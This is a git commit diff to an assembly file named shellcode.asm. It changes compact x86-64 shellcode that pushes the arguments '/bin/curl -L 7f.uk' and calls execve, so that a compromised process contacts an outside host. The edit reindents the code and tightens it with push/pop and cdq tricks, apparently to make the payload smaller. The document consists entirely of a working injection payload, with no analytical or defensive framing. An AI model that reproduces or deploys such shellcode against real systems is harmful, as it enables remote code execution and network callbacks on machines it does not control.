df50ca2f60c684336aa97b2b05e58e0c0332e15e
Jonathan Bar Or <30564634+yo-yo-yo-jbo@users.noreply.github.com>
2024-06-24 19:32:20 -0700

    Update shellcode.asm

--- shellcode.asm
+++ shellcode.asm
@@ -3,35 +3,34 @@
 ; Constants
 EXECVE_SYSCALL_NUM EQU 0x3B
 
-	; Jump over argv
-	call after_argv
+        ; Jump over argv
+        call after_argv
 
-	; argv in reverse order
-	db `7f.uk\x00`
-	db `-L\x00`
-	db `/bin/curl\x00`
+        ; argv in reverse order
+        db `7f.uk\x00`
+        db `-L\x00`
+        db `/bin/curl\x00`
 
 after_argv:
 
-	; Save argv pointer
-	pop rdi
+        ; Save argv pointer
+        pop rdi
 
-	; Set envp
-	xor rdx, rdx
+        ; Set the syscall number into RAX
+        push EXECVE_SYSCALL_NUM
+        pop rax
 
-	; Prepare argv in stack
-	push rdx
-	push rdi
-	add rdi, 6
-	push rdi
-	add rdi, 3
-	push rdi	; At this point RDI also points to main executable
-	mov rsi, rsp
-	
-	; Set the syscall number into RAX
-	push EXECVE_SYSCALL_NUM
-	pop rax
+        ; Set envp (from RAX to RDX)
+        cdq
 
-	; Call execve
-	syscall
+        ; Prepare argv in stack
+        push rdx
+        push rdi
+        add rdi, 6
+        push rdi
+        add rdi, 3
+        push rdi        ; At this point RDI also points to main executable
+        mov rsi, rsp
 
+        ; Call execve
+        syscall
